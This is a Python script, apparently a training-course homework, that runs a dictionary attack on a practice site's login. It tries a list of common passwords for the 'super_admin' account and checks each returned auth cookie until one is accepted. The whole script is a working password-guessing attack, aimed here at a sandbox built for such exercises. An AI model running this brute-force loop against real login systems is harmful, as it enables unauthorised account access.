import requests

url_check_pass = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url_check_cookies = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
passwords = words_set = {
    '123456', '12345678', 'qwerty', 'abc123', 'monkey', '1234567', 'letmein', 'trustno1', 'dragon',
    'baseball', '111111', 'iloveyou', 'master', 'sunshine', 'ashley', 'bailey', 'passw0rd', 'shadow',
    '123123', '654321', 'superman', 'qazwsx', 'michael', 'Football', 'welcome', 'jesus', 'ninja',
    'mustang', 'password1', '123456789', '-___ adobe123[a]', 'admin', '1234567890', '-___ photoshop',
    '1234', '12345', 'princess', 'azerty', '000000', 'access', '696969', 'batman', '1qaz2wsx',
    'login', 'qwertyuiop', 'solo', 'starwars', '121212', 'flower', 'hottie', 'loveme', 'zaq1zaq1',
    'hello', 'freedom', 'whatever', '666666', '!@#$%^&*', 'charlie', 'aa123456', 'donald',
    'qwerty123', '1q2w3e4r', '555555', 'lovely', '7777777', '888888', '123qwe'
}

cookies ={}

for password in passwords:
    payload = {"login": "super_admin", "password": password}
    response = requests.post(url_check_pass, data=payload)
    cookie_value = response.cookies.get('auth_cookie')
    if cookie_value is not None:
        cookies.update({'auth_cookie': cookie_value})
        response_2 = requests.post(url_check_cookies, cookies=cookies)
        if response_2.text == "You are authorized":
            print(response_2.text)
            print(f"пароль найден: {password}")
            break
        else:
            print(response_2.text)
            print(f"Пароль -- {password} -- не подходит, продолжаем подбор")



